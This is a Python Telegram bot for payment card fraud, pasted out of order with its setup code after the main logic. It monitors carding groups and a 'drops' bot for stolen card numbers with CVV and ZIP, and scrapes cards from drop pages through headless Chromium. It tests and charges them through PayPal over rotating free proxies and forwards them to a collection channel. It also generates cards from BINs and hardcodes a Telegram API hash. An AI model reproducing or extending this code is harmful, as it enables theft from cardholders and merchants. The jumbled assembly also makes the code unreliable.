                self._log("browser", "Clicked Open Drop")
                await asyncio.sleep(2)
                await self._wait_for_security_check(page)
                return True
        except Exception as e:
            self._log("browser", f"Open Drop error: {e}")
        return False

    async def _resolve_url(self, tme_url, source_peer):
        try:
            parsed = urllib.parse.urlparse(tme_url)
            qs = urllib.parse.parse_qs(parsed.query)
            startapp = qs.get("startapp", [None])[0]
            if not startapp:
                return tme_url
            bot_entity = await self.bot_client.get_input_entity("xForceDropsBot")
            if source_peer:
                try:
                    peer = await self.bot_client.get_input_entity(source_peer)
                except:
                    peer = bot_entity
            else:
                peer = bot_entity
            result = await self.bot_client(RequestAppWebViewRequest(
                peer=peer,
                app=InputBotAppShortName(bot_id=bot_entity, short_name="webapp"),
                platform="android",
                start_param=startapp,
                write_allowed=True,
            ))
            return result.url
        except Exception as e:
            self._log("resolve", f"Failed: {e}")
            return tme_url

    async def forward_raw_card(self, card_str: str, source: str = "drop", zip_code=None):
        """Immediately forward the raw card data to target group."""
        msg = f"💳 *RAW CARD ({source})*\n`{card_str}`"
        if zip_code:
            msg += f"\n📮 ZIP: `{zip_code}`"
        try:
            await self.bot_client.send_message(self.target_group, msg)
            self._log("forward", f"✅ Raw card forwarded: {card_str[:20]}...")
        except Exception as e:
            self._log("forward", f"❌ Raw forward failed: {e}")

    async def check_and_forward(self, n, mm, yy, cvv, zip_code=None):
        card = f"{n}|{mm}|{yy}|{cvv}"
        card_hash = hashlib.md5(card.encode()).hexdigest()
        if card_hash in self.processed_cards:
            return
        self.processed_cards.add(card_hash)
        self._save_state()

        self._log("check", f"Checking {n[:4]}...{n[-4:]}")
        loop = asyncio.get_event_loop()

        # PayPal check
        paypal_result = await loop.run_in_executor(None, PayPalCharger(proxy=ProxyManager.get()).charge, card)

        # BIN info
        bin_info = await get_bin_info(n[:6])

        # Format PayPal result
        if paypal_result.startswith("CHARGED"):
            paypal_status = "CHARGED 💰"
        elif paypal_result.startswith("APPROVED"):
            paypal_status = "APPROVED 🟢"
        elif paypal_result.startswith("DECLINED"):
            paypal_status = "DECLINED 🔴"
        else:
            paypal_status = "ERROR ⚠️"
        paypal_text = paypal_result.split("|", 1)[-1] if "|" in paypal_result else paypal_result

        msg = (
            f"┏━━━━━━━⍟\n┃ CARD CHECK 💳 ({BOT_USERNAME})\n┗━━━━━━━━━━━⊛\n"
            f"[❃] 𝗖𝗮𝗿𝗱    ➜ `{card}`\n"
        )
        if zip_code:
            msg += f"[❃] 𝗭𝗜𝗣     ➜ `{zip_code}`\n"
        if bin_info:
            msg += (
                f"[❃] 𝗕𝗿𝗮𝗻𝗱  ➜ {bin_info.get('brand', 'UNKNOWN')}\n"
                f"[❃] 𝗧𝘆𝗽𝗲   ➜ {bin_info.get('type', 'UNKNOWN')}\n"
                f"[❃] 𝗕𝗮𝗻𝗸   ➜ {bin_info.get('bank', 'Unknown')}\n"
                f"[❃] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆➜ {bin_info.get('country', 'Unknown')}\n"
                f"[❃] 𝗟𝗲𝘃𝗲𝗹  ➜ {bin_info.get('level', 'STANDARD')}\n"
                f"[❃] 𝗙𝗶𝗿𝘀𝘁𝟲➜ {n[:6]}\n[❃] 𝗟𝗮𝘀𝘁𝟰 ➜ {n[-4:]}\n"
            )
        msg += (
            f"\n┏━━━━━━━⍟\n┃ PAYPAL CHECK 💳\n┗━━━━━━━━━━━⊛\n"
            f"[❃] {paypal_status} | {paypal_text}\n"
        )
        try:
            await self.bot_client.send_message(self.target_group, msg)
            self._log("forward", f"✅ Forwarded {n[:4]}...{n[-4:]}" + (f" (ZIP: {zip_code})" if zip_code else ""))
        except Exception as e:
            self._log("forward", f"ERROR: {e}")

    def _ensure_worker(self):
        if self._worker_task is None or self._worker_task.done():
            self._worker_task = asyncio.ensure_future(self._queue_worker())

    async def _queue_worker(self):
        while True:
            try:
                url, peer = await self._drop_queue.get()
                await self._run_browser(url, peer)
                self._drop_queue.task_done()
            except asyncio.CancelledError:
                break
            except Exception as e:
                self._log("worker", f"Error: {e}")

    async def _run_browser(self, url, peer):
        if not PLAYWRIGHT_OK:
            return

        resolved = await self._resolve_url(url, peer)
        self._log("browser", f"Opening: {resolved[:100]}...")

        _saved = os.environ.pop("LD_LIBRARY_PATH", None)
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(
                    headless=True,
                    executable_path=PLAYWRIGHT_EXECUTABLE_PATH,
                    args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"]
                )
                ctx = await browser.new_context(
                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
                    viewport={"width": 1280, "height": 720},
                    permissions=["clipboard-read", "clipboard-write"],
                )
                page = await ctx.new_page()

                await page.goto(resolved, wait_until="domcontentloaded", timeout=60000)
                await page.wait_for_load_state("networkidle", timeout=30000)

                # Handle interstitial
                try:
                    open_btn = await page.wait_for_selector('button:has-text("OPEN APP")', timeout=5000)
                    if open_btn:
                        await open_btn.click()
                        await asyncio.sleep(3)
                except:
                    pass

                # Click Open Drop and wait for security check
                success = await self._click_open_drop(page)
                if not success:
                    self._log("browser", "Failed to click Open Drop or security check timed out")
                    await browser.close()
                    return

                # Try to get card via copy button
                if await self._click_copy_button(page):
                    clipboard = await self._get_clipboard(page)
                    if clipboard:
                        card_data = extract_card_from_text(clipboard)
                        if card_data:
                            n, mm, yy, cvv, zip_code = card_data
                            card_str = f"{n}|{mm}|{yy}|{cvv}"
                            card_hash = hashlib.md5(card_str.encode()).hexdigest()
                            if card_hash not in self.processed_cards:
                                # Forward raw card immediately
                                await self.forward_raw_card(card_str, source="clipboard", zip_code=zip_code)
                                # Then do full PayPal check
                                await self.check_and_forward(n, mm, yy, cvv, zip_code=zip_code)
                            await browser.close()
                            return

                # Fallback: try to find card in DOM
                content = await page.content()
                card_data = extract_card_from_text(content)
                if card_data:
                    n, mm, yy, cvv, zip_code = card_data
                    card_str = f"{n}|{mm}|{yy}|{cvv}"
                    card_hash = hashlib.md5(card_str.encode()).hexdigest()
                    if card_hash not in self.processed_cards:
                        await self.forward_raw_card(card_str, source="dom", zip_code=zip_code)
                        await self.check_and_forward(n, mm, yy, cvv, zip_code=zip_code)
                    await browser.close()
                    return

                self._log("browser", "❌ No card found after all attempts")
                await browser.close()

        except Exception as e:
            self._log("browser", f"Error: {e}")
        finally:
            if _saved is not None:
                os.environ["LD_LIBRARY_PATH"] = _saved

    async def on_message(self, event):
        text = event.raw_text or ""

        # Check for View Drop/Open Drop messages
        if "View Drop" in text or "VIEW DROP" in text.upper() or "Open Drop" in text:
            url = await self._get_drop_url(event)
            if url and url not in self.processed_links:
                self.processed_links.add(url)
                self._save_state()
                await self._drop_queue.put((url, event.chat))
                self._ensure_worker()
            return

        # Check for direct card in message
        card_data = extract_card_from_text(text)
        if card_data:
            n, mm, yy, cvv, zip_code = card_data
            await self.check_and_forward(n, mm, yy, cvv, zip_code=zip_code)

# ======================================================================
# Main bot logic
# ======================================================================
async def find_entity_by_title(title: str):
    title_lower = title.lower()
    async for dialog in client.iter_dialogs():
        if hasattr(dialog.entity, "title") and dialog.entity.title:
            if title_lower in dialog.entity.title.lower():
                return dialog.entity
    return None

async def join_and_resolve(chat: str):
    if chat.startswith("+") or "t.me/+" in chat or "joinchat" in chat:
        invite = chat.lstrip("+")
        if "t.me/+" in chat:
            invite = chat.split("t.me/+")[-1]
        elif "joinchat/" in chat:
            invite = chat.split("joinchat/")[-1]
        try:
            result = await client(ImportChatInviteRequest(invite))
            return result.chats[0]
        except UserAlreadyParticipantError:
            try:
                info = await client(CheckChatInviteRequest(hash=invite))
                chat_obj = getattr(info, 'chat', None)
                if chat_obj:
                    print(f"[OK] Already in group: {getattr(chat_obj, 'title', invite)}")
                    return chat_obj
            except:
                pass
            async for dialog in client.iter_dialogs():
                e = dialog.entity
                if getattr(e, 'megagroup', False) or getattr(e, 'broadcast', False):
                    return e
            return None
        except Exception as e:
            logger.error(f"Join failed for {chat}: {e}")
            return None
    else:
        try:
            return await client.get_entity(chat)
        except:
            pass
        entity = await find_entity_by_title(chat)
        if entity:
            return entity
        logger.error(f"Resolve failed for: {chat}")
        return None

async def run_scraper():
    await client.start()
    print(f"[🤖 {BOT_USERNAME}] Bot online", flush=True)
    print(f"📡 Watching: {SOURCE_CHATS_RAW}", flush=True)
    print(f"📤 Forwarding to: {FORWARD_TARGET}", flush=True)
    if not PLAYWRIGHT_OK:
        print("[WARN] Playwright missing – xForce drops disabled", flush=True)

    resolved = []
    for chat in SOURCE_CHATS_RAW:
        entity = await join_and_resolve(chat)
        if entity:
            resolved.append(entity)
            title = getattr(entity, 'title', None) or getattr(entity, 'username', chat)
            print(f"[OK] Watching: {title}", flush=True)
        else:
            print(f"[WARN] Could not resolve: {chat}", flush=True)

    if not resolved:
        print("[ERROR] No channels resolved.", flush=True)
        return

    xforce = XForceAutomator(client, FORWARD_TARGET)

    async def handle_messages(event):
        text = event.raw_text or ""
        card_data = extract_card_from_text(text)
        if card_data:
            n, mm, yy, cvv, zip_code = card_data
            await xforce.check_and_forward(n, mm, yy, cvv, zip_code=zip_code)
        await xforce.on_message(event)

    client.add_event_handler(handle_messages, events.NewMessage(chats=resolved))
    client.add_event_handler(xforce.on_message, events.NewMessage(chats=[XFORCE_BOT_USERNAME], incoming=True))

    # Commands
    async def handle_commands(event):
        text = (event.raw_text or "").strip()
        parts = text.split(None, 2)
        cmd = parts[0].lower().lstrip("/").split("@")[0]
        args = parts[1] if len(parts) > 1 else ""

        if cmd == "help":
            await event.reply("Commands: /gen, /bin, /chkpp, /drop, /status, /addchat, /removechat, /clearchat")
        elif cmd == "gen":
            args_parts = args.strip().split()
            if not args_parts:
                await event.reply("Usage: `/gen 414720` or `/gen 414720 10`")
                return
            bin_prefix = args_parts[0][:6]
            if not bin_prefix.isdigit():
                await event.reply("Invalid BIN")
                return
            count = 1
            if len(args_parts) > 1:
                try: count = min(int(args_parts[1]), 100)
                except: count = 1
            bin_info = await get_bin_info(bin_prefix) if len(bin_prefix) >= 6 else None
            cards = [generate_card_with_bin(bin_prefix) for _ in range(count)]
            if bin_info:
                header = f"┏━━━━━━━⍟\n┃ GENERATED {count} CARD{'S' if count>1 else ''} 💳\n┗━━━━━━━━━━━⊛\n[❃] 𝗕𝗿𝗮𝗻𝗱  ➜ {bin_info.get('brand','?')}\n[❃] 𝗧𝘆𝗽𝗲   ➜ {bin_info.get('type','?')}\n[❃] 𝗕𝗮𝗻𝗸   ➜ {bin_info.get('bank','?')}\n[❃] 𝗟𝗲𝘃𝗲𝗹  ➜ {bin_info.get('level','?')}\n[❃] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆➜ {bin_info.get('country','?')}\n[❃] 𝗙𝗶𝗿𝘀𝘁𝟲➜ {bin_prefix}\n\n"
            else:
                header = f"┏━━━━━━━⍟\n┃ GENERATED {count} CARD{'S' if count>1 else ''} 💳\n┗━━━━━━━━━━━⊛\n"
            card_lines = [f"[{i}] `{card}`" for i, card in enumerate(cards, 1)]
            full_msg = header + "\n".join(card_lines)
            if len(full_msg) > 4000:
                await event.reply(header + "\n".join(card_lines[:30]))
                if count > 30:
                    await event.reply("\n".join(card_lines[30:]))
            else:
                await event.reply(full_msg)
        elif cmd == "bin":
            if not args:
                await event.reply("Usage: `/bin 414720`")
                return
            raw_digits = re.findall(r'\d{6,}', args)
            bins = list(dict.fromkeys(d[:6] for d in raw_digits))
            if not bins:
                await event.reply("No valid BINs")
                return
            status_msg = await event.reply(f"🔍 Looking up {len(bins)} BIN(s)...")
            results = await asyncio.gather(*[get_bin_info(b) for b in bins])
            lines = []
            for b, info in zip(bins, results):
                if not info:
                    lines.append(f"`{b}` — ❌ Not found")
                else:
                    flag = {"US":"🇺🇸","GB":"🇬🇧","CA":"🇨🇦","AU":"🇦🇺","DE":"🇩🇪","FR":"🇫🇷"}.get(info.get("country_code",""), "🌐")
                    prepaid = " [PREPAID]" if info.get("prepaid") else ""
                    lines.append(f"`{b}` {flag} {info.get('brand','?')} {info.get('type','?')}{prepaid} — {info.get('bank','Unknown')} | {info.get('country','Unknown')}")
            chunk = []
            for line in lines:
                chunk.append(line)
                if len("\n".join(chunk)) > 3800:
                    await status_msg.edit("\n".join(chunk[:-1]))
                    chunk = [chunk[-1]]
            await status_msg.edit(f"┏━━━━━━━⍟\n┃ BIN LOOKUP 🔍 ({len(bins)} BINs)\n┗━━━━━━━━━━━⊛\n" + "\n".join(chunk))
        elif cmd == "chkpp":
            if not args:
                await event.reply("Usage: `/chkpp CC|MM|YY|CVV`")
                return
            card = args.strip()
            if len(card.split("|")) < 4:
                await event.reply("Format: `CC|MM|YY|CVV`")
                return
            n = card.split("|")[0]
            status_msg = await event.reply("🔄 PayPal...")
            paypal_result = await asyncio.get_event_loop().run_in_executor(None, PayPalCharger(proxy=ProxyManager.get()).charge, card)
            bin_info = await get_bin_info(n[:6]) if len(n) >= 6 else None
            if paypal_result.startswith("CHARGED"): status = "CHARGED 💰"
            elif paypal_result.startswith("APPROVED"): status = "APPROVED 🟢"
            elif paypal_result.startswith("DECLINED"): status = "DECLINED 🔴"
            else: status = "ERROR ⚠️"
            response_text = paypal_result.split("|",1)[-1] if "|" in paypal_result else paypal_result
            msg = f"┏━━━━━━━⍟\n┃ {status}\n┗━━━━━━━━━━━⊛\n[❃] 𝗖𝗮𝗿𝗱    ➜ `{card}`\n[❃] 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➜ PayPal\n[❃] 𝗥𝗲𝘀𝗽    ➜ {response_text}\n"
            if bin_info:
                msg += f"[❃] 𝗕𝗿𝗮𝗻𝗱  ➜ {bin_info.get('brand','?')}\n[❃] 𝗧𝘆𝗽𝗲   ➜ {bin_info.get('type','?')}\n[❃] 𝗕𝗮𝗻𝗸   ➜ {bin_info.get('bank','?')}\n[❃] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆➜ {bin_info.get('country','?')}\n"
            await status_msg.edit(msg)
        elif cmd == "drop":
            card_text = args.strip()
            card_data = extract_card_from_text(card_text)
            if not card_data:
                await event.reply("Usage: `/drop CC|MM|YY|CVV`")
                return
            n, mm, yy, cvv, zip_code = card_data
            await xforce.check_and_forward(n, mm, yy, cvv, zip_code=zip_code)
        elif cmd == "status":
            qsize = xforce._drop_queue.qsize() if xforce else 0
            pw = "✅ ready" if PLAYWRIGHT_OK else "❌ disabled"
            msg = f"📊 Status\nPlaywright: {pw}\nQueue depth: {qsize}\nLinks: {len(xforce.processed_links)}\nCards: {len(xforce.processed_cards)}"
            await event.reply(msg)
        elif cmd == "clearchat":
            try: await client.delete_messages(event.chat_id, event.message.id)
            except: pass
            await event.reply("\n" * 50 + "🧹 Chat cleared")
        elif cmd == "addchat":
            if not args:
                await event.reply("Usage: `/addchat <username or invite link>`")
                return
            chat_arg = args.strip()
            if chat_arg in SOURCE_CHATS_RAW:
                await event.reply(f"Already watching `{chat_arg}`")
                return
            entity = await join_and_resolve(chat_arg)
            if entity:
                SOURCE_CHATS_RAW.append(chat_arg)
                _save_watched_chats(SOURCE_CHATS_RAW)
                resolved.append(entity)
                title = getattr(entity, 'title', None) or getattr(entity, 'username', chat_arg)
                client.add_event_handler(handle_messages, events.NewMessage(chats=[entity]))
                await event.reply(f"✅ Added `{chat_arg}` ({title})\nTotal: {len(SOURCE_CHATS_RAW)}")
            else:
                await event.reply(f"❌ Could not resolve `{chat_arg}`")
        elif cmd == "removechat":
            if not args:
                await event.reply("Usage: `/removechat <username or invite link>`")
                return
            chat_arg = args.strip()
            if chat_arg not in SOURCE_CHATS_RAW:
                await event.reply(f"Not watching `{chat_arg}`")
                return
            SOURCE_CHATS_RAW.remove(chat_arg)
            _save_watched_chats(SOURCE_CHATS_RAW)
            await event.reply(f"✅ Removed `{chat_arg}`\nTotal: {len(SOURCE_CHATS_RAW)}")

    client.add_event_handler(handle_commands, events.NewMessage(outgoing=True, pattern=r'^/(help|gen|bin|chkpp|clearchat|drop|status|addchat|removechat)\b'))
    print(f"[✅] Listening for new messages in {len(resolved)} chat(s)...", flush=True)
    await client.run_until_disconnected()

async def _notify(msg: str):
    try:
        if client.is_connected():
            await client.send_message(FORWARD_TARGET, msg)
    except:
        pass

async def watchdog():
    if RUN_MODE in ("both", "scraper"):
        first_run = True
        backoff = 15
        while True:
            try:
                if not first_run:
                    try:
                        if client.is_connected():
                            await client.disconnect()
                    except:
                        pass
                    await asyncio.sleep(2)
                    ts = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
                    print(f"[WATCHDOG] Reconnecting at {ts}...", flush=True)
                    try:
                        await _notify(f"🔄 *Bot Restarted*\n⏰ {ts}\n✅ Back online.")
                    except:
                        pass
                first_run = False
                backoff = 15
                await run_scraper()
            except Exception as e:
                ts = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
                err_str = str(e)[:300]
                logger.error(f"Scraper crashed: {e}")
                print(f"[WATCHDOG] Crashed: {e} — retry in {backoff}s", flush=True)
                try:
                    await _notify(f"🚨 *Bot Crashed*\n⏰ {ts}\n❌ Error: `{err_str}`\n♻️ Restarting in {backoff}s...")
                except:
                    pass
                await asyncio.sleep(backoff)
                backoff = min(backoff * 2, 300)

if __name__ == "__main__":
    if RUN_MODE == "web":
        run_flask()
    else:
        if RUN_MODE in ("both", "web"):
            _ft = Thread(target=run_flask, daemon=True)
            _ft.start()
            print(f"[🌐] Flask server on port {PORT}", flush=True)
        result = setup_playwright()
        if result:
            print("[OK] Playwright ready – xForce drops enabled", flush=True)
        else:
            print("[WARN] Playwright not available. xForce drops disabled.", flush=True)
        outer_backoff = 15
        while True:
            try:
                asyncio.run(watchdog())
            except KeyboardInterrupt:
                print("[MAIN] Stopped by user.", flush=True)
                break
            except Exception as e:
                print(f"[MAIN] Event loop crashed: {e} — restarting in {outer_backoff}s...", flush=True)
                time.sleep(outer_backoff)
                outer_backoff = min(outer_backoff * 2, 300)#!/usr/bin/env python3
                """
                Telegram Card Checker Bot – PayPal Only + BIN Lookup + ZIP Capture
                - Monitors groups & xForce drops
                - Extracts cards (CC|MM|YY|CVV + optional fields)
                - Checks via PayPal (country‑aware addresses)
                - Forwards result to OxyCondoneIt (includes ZIP if present)
                - Commands: /gen, /bin, /chkpp, /drop, /status, /addchat, /removechat, /clearchat
                """

                import re
                import asyncio
                import logging
                import os
                import random
                import json
                import aiohttp
                import requests
                import time
                import hashlib
                import subprocess
                import sys
                import glob
                import urllib.parse
                import threading
                from datetime import datetime, timezone
                from threading import Thread
                from typing import Dict, Optional, List

                # ======================================================================
                # FORCE LD_LIBRARY_PATH (fixes libnspr4.so missing on Replit)
                # ======================================================================
                def set_nix_library_path():
                    if not (os.environ.get("REPL_ID") or os.path.exists("/home/runner/.replit")):
                        return
                    keywords = [
                        "nspr", "nss", "atk", "at-spi2", "gtk3", "alsa-lib", "dbus", "glib",
                        "libx11", "libxcb", "libxkbcommon", "libxcomposite", "libxdamage",
                        "libxext", "libxfixes", "libxrandr", "expat", "cups",
                        "mesa", "cairo", "pango",
                    ]
                    paths = set()
                    try:
                        nix_entries = os.listdir("/nix/store")
                    except Exception:
                        return
                    for entry in nix_entries:
                        lower = entry.lower()
                        if lower.endswith(".drv") or lower.endswith("-dev") or lower.endswith("-doc"):
                            continue
                        for kw in keywords:
                            if f"-{kw}-" in lower or lower.endswith(f"-{kw}"):
                                lib_dir = f"/nix/store/{entry}/lib"
                                if os.path.isdir(lib_dir):
                                    paths.add(lib_dir)
                                break
                    if paths:
                        existing = os.environ.get("LD_LIBRARY_PATH", "")
                        os.environ["LD_LIBRARY_PATH"] = ":".join(paths) + (":" + existing if existing else "")
                        print("[FIX] LD_LIBRARY_PATH updated.", flush=True)

                set_nix_library_path()

                # ======================================================================
                # Write replit.nix only if missing
                # ======================================================================
                def ensure_replit_nix():
                    nix_path = "replit.nix"
                    if os.path.exists(nix_path):
                        with open(nix_path, "r") as f:
                            if "playwright" in f.read():
                                return False
                    content = '''{ pkgs }: {
                  deps = [
                    pkgs.playwright
                    pkgs.nss
                    pkgs.nspr
                    pkgs.atk
                    pkgs.at-spi2-atk
                    pkgs.cups
                    pkgs.libdrm
                    pkgs.libxkbcommon
                    pkgs.mesa
                    pkgs.xorg.libXcomposite
                    pkgs.xorg.libXdamage
                    pkgs.xorg.libXrandr
                    pkgs.xorg.libXtst
                    pkgs.xorg.libXScrnSaver
                    pkgs.xorg.libX11
                    pkgs.xorg.libxcb
                    pkgs.gtk3
                    pkgs.alsa-lib
                    pkgs.dbus
                    pkgs.expat
                    pkgs.fontconfig
                    pkgs.libXrender
                    pkgs.libXfixes
                    pkgs.libXcursor
                    pkgs.libXi
                    pkgs.pango
                    pkgs.cairo
                    pkgs.libGL
                    pkgs.glib
                    pkgs.libxshmfence
                  ];
                }
                '''
                    with open(nix_path, "w") as f:
                        f.write(content)
                    print("[PLAYWRIGHT] Created replit.nix. Please STOP and RUN your Repl again.", flush=True)
                    return True

                if ensure_replit_nix():
                    sys.exit(0)

                # ======================================================================
                # Auto‑install Chromium
                # ======================================================================
                def ensure_chromium_installed():
                    cache_dirs = [
                        os.path.expanduser("~/.cache/ms-playwright"),
                        os.path.join(os.getcwd(), ".cache", "ms-playwright"),
                    ]
                    def _find_binary():
                        for cache_dir in cache_dirs:
                            for name in ["chrome", "chrome-headless-shell"]:
                                try:
                                    result = subprocess.run(["find", cache_dir, "-name", name, "-type", "f"], capture_output=True, text=True, timeout=5)
                                    if result.stdout.strip():
                                        return True
                                except:
                                    pass
                        return False
                    if _find_binary():
                        print("[PLAYWRIGHT] Chromium already installed.", flush=True)
                        return True
                    print("[PLAYWRIGHT] Installing Chromium (1-2 min)...", flush=True)
                    try:
                        subprocess.run([sys.executable, "-m", "playwright", "install", "chromium"], check=True, timeout=180)
                        print("[PLAYWRIGHT] Chromium installation completed.", flush=True)
                        for _ in range(10):
                            time.sleep(1)
                            if _find_binary():
                                print("[PLAYWRIGHT] Chromium binary found.", flush=True)
                                return True
                    except Exception as e:
                        print(f"[PLAYWRIGHT] Installation error: {e}", flush=True)
                    return False

                # ======================================================================
                # Playwright setup
                # ======================================================================
                CHROMIUM_INSTALLED = False
                PLAYWRIGHT_OK = False
                PLAYWRIGHT_EXECUTABLE_PATH = None

                def find_chromium_executable():
                    try:
                        best = None
                        for entry in os.listdir("/nix/store"):
                            lower = entry.lower()
                            if lower.endswith(".drv") or "-dev" in lower or "-doc" in lower:
                                continue
                            if re.match(r'^[a-z0-9]+-chromium-\d', lower) and "sandbox" not in lower:
                                for name in ["chromium", "chromium-browser"]:
                                    candidate = f"/nix/store/{entry}/bin/{name}"
                                    if os.path.isfile(candidate) and os.access(candidate, os.X_OK):
                                        if best is None or entry > best[0]:
                                            best = (entry, candidate)
                        if best:
                            print(f"[PLAYWRIGHT] Using Nix chromium: {best[1]}", flush=True)
                            return best[1]
                    except Exception:
                        pass
                    cache_dirs = [
                        os.path.expanduser("~/.cache/ms-playwright"),
                        os.path.join(os.getcwd(), ".cache", "ms-playwright"),
                    ]
                    for cache_dir in cache_dirs:
                        for pattern in [
                            os.path.join(cache_dir, "chromium-*/chrome-linux*/chrome"),
                            os.path.join(cache_dir, "chromium_headless_shell-*/chrome-headless-shell-linux64/chrome-headless-shell"),
                        ]:
                            matches = glob.glob(pattern)
                            if matches:
                                return matches[0]
                    return None

                def create_wrapper_script(real_chrome_path):
                    wrapper_dir = os.path.expanduser("~/playwright-wrapper")
                    os.makedirs(wrapper_dir, exist_ok=True)
                    wrapper_path = os.path.join(wrapper_dir, "chromium-wrapper.sh")
                    ld_path = os.environ.get("LD_LIBRARY_PATH", "")
                    content = f"""#!/bin/bash
                export LD_LIBRARY_PATH="{ld_path}"
                exec "{real_chrome_path}" "$@"
                """
                    with open(wrapper_path, "w") as f:
                        f.write(content)
                    os.chmod(wrapper_path, 0o755)
                    print(f"[PLAYWRIGHT] Wrapper created at {wrapper_path}", flush=True)
                    return wrapper_path

                def setup_playwright():
                    global CHROMIUM_INSTALLED, PLAYWRIGHT_OK, PLAYWRIGHT_EXECUTABLE_PATH
                    CHROMIUM_INSTALLED = ensure_chromium_installed()
                    if not CHROMIUM_INSTALLED:
                        print("[PLAYWRIGHT] Chromium not installed – Playwright disabled.", flush=True)
                        return False
                    chrome_path = find_chromium_executable()
                    if not chrome_path:
                        print("[PLAYWRIGHT] Chromium binary not found.", flush=True)
                        return False
                    print(f"[PLAYWRIGHT] Found Chromium at {chrome_path}", flush=True)
                    is_nix = chrome_path.startswith("/nix/store/")
                    executable = chrome_path if is_nix else create_wrapper_script(chrome_path)
                    if not executable:
                        return False
                    if not is_nix:
                        print(f"[PLAYWRIGHT] Wrapper created at {executable}", flush=True)
                    PLAYWRIGHT_EXECUTABLE_PATH = executable
                    from playwright.sync_api import sync_playwright
                    saved_ldpath = os.environ.pop("LD_LIBRARY_PATH", None)
                    try:
                        for label, path in [("primary", executable), ("fallback", chrome_path)]:
                            try:
                                with sync_playwright() as p:
                                    browser = p.chromium.launch(
                                        headless=True,
                                        executable_path=path,
                                        args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"]
                                    )
                                    browser.close()
                                print(f"[PLAYWRIGHT] Playwright working ({label})!", flush=True)
                                PLAYWRIGHT_EXECUTABLE_PATH = path
                                PLAYWRIGHT_OK = True
                                return True
                            except Exception as e:
                                print(f"[PLAYWRIGHT] {label} failed: {str(e)[:120]}", flush=True)
                    finally:
                        if saved_ldpath is not None:
                            os.environ["LD_LIBRARY_PATH"] = saved_ldpath
                    return False

                from playwright.async_api import async_playwright as _real_async_playwright

                class async_playwright:
                    async def __aenter__(self):
                        if PLAYWRIGHT_OK:
                            self._ctx = _real_async_playwright()
                            return await self._ctx.__aenter__()
                        return self
                    async def __aexit__(self, *args):
                        if PLAYWRIGHT_OK and hasattr(self, "_ctx"):
                            await self._ctx.__aexit__(*args)
                    def chromium(self):
                        class Dummy:
                            async def launch(self, **kwargs):
                                raise RuntimeError("Playwright unavailable")
                        return Dummy()

                # ======================================================================
                # Proxy Manager (for PayPal only)
                # ======================================================================
                class ProxyManager:
                    _proxies: List[str] = []
                    _index = 0
                    _last_fetch = 0
                    _fetch_interval = 300
                    _lock = threading.Lock()

                    @classmethod
                    def _init_lock(cls):
                        if cls._lock is None:
                            import threading
                            cls._lock = threading.Lock()

                    @classmethod
                    def _test_proxy(cls, proxy_url: str, timeout: int = 8) -> bool:
                        try:
                            r = requests.get("https://api.stripe.com/v1", proxies={"https": proxy_url}, timeout=timeout)
                            return r.status_code in (200, 401)
                        except Exception:
                            return False

                    @classmethod
                    def fetch(cls) -> List[str]:
                        cls._init_lock()
                        with cls._lock:
                            now = time.time()
                            if now - cls._last_fetch < cls._fetch_interval and cls._proxies:
                                return cls._proxies
                            sources = [
                                "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text&timeout=8000",
                                "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
                            ]
                            raw = []
                            for url in sources:
                                try:
                                    r = requests.get(url, timeout=15)
                                    raw += [l.strip() for l in r.text.strip().splitlines() if l.strip() and ":" in l]
                                except Exception:
                                    continue
                            seen = set()
                            candidates = []
                            for p in raw:
                                if "//" not in p:
                                    p = "http://" + p
                                if p not in seen:
                                    seen.add(p)
                                    candidates.append(p)
                            tested = []
                            for p in candidates[:40]:
                                if cls._test_proxy(p):
                                    tested.append(p)
                            cls._proxies = tested
                            cls._last_fetch = now
                            cls._index = 0
                            print(f"[ProxyManager] {len(tested)} working proxies", flush=True)
                            return tested

                    @classmethod
                    def get(cls) -> Optional[str]:
                        cls._init_lock()
                        with cls._lock:
                            if not cls._proxies:
                                return None
                            proxy = cls._proxies[cls._index % len(cls._proxies)]
                            cls._index += 1
                            return proxy

                    @classmethod
                    def remove(cls, proxy_url: str):
                        cls._init_lock()
                        with cls._lock:
                            if proxy_url in cls._proxies:
                                cls._proxies.remove(proxy_url)

                # ======================================================================
                # Flask web server
                # ======================================================================
                from flask import Flask, jsonify
                flask_app = Flask(__name__)
                BOT_USERNAME = "Oxy"
                PORT = int(os.environ.get("PORT", 8080))
                RUN_MODE = os.environ.get("RUN_MODE", "both").lower()

                @flask_app.route('/')
                def home():
                    return jsonify({"status": "alive", "bot": BOT_USERNAME, "playwright_ok": PLAYWRIGHT_OK})
                @flask_app.route('/health')
                def health():
                    return jsonify({"status": "healthy"})
                def run_flask():
                    flask_app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)

                logging.basicConfig(filename="scraper.log", level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
                logger = logging.getLogger()

                # ======================================================================
                # Telegram configuration
                # ======================================================================
                API_ID = 37079398  # REPLACE WITH YOUR API ID
                API_HASH = "678f499b4345b640ba83ed7b1fc1efc0"  # REPLACE
                SESSION_NAME = "mysession"
                WATCHED_CHATS_FILE = "watched_chats.json"

                DEFAULT_SOURCE_CHATS = [
                    "https://t.me/+01N1N0nFYEA4MWRl",
                    "newscrapper4",
                    "cc_checker_Stuff",
                    "xForceDropsBot",
                    "X-Force Group",
                ]

                def _load_watched_chats():
                    if os.path.exists(WATCHED_CHATS_FILE):
                        try:
                            with open(WATCHED_CHATS_FILE, "r") as f:
                                return json.load(f)
                        except Exception:
                            pass
                    return list(DEFAULT_SOURCE_CHATS)

                def _save_watched_chats(chats):
                    try:
                        with open(WATCHED_CHATS_FILE, "w") as f:
                            json.dump(chats, f)
                    except Exception:
                        pass

                SOURCE_CHATS_RAW = _load_watched_chats()
                XFORCE_BOT_USERNAME = "xForceDropsBot"
                FORWARD_TARGET = "OxyCondoneIt"

                from telethon import TelegramClient, events
